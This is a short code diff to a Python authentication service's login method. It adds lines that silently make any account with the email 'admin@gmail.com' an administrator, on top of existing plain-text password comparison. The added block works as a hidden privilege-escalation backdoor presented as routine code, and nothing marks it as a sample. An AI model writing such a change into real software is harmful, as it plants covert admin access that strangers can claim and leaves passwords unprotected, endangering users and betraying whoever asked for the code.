@@ -38,6 +38,10 @@ class AuthService:
         # Plain text password comparison
         if user.password != password:
             raise InvalidCredentialsError("Incorrect password")
+
+        # Grant admin privileges for the special admin email
+        if user.email.lower() == "admin@gmail.com":
+            user.is_admin = True
             
         return user
 
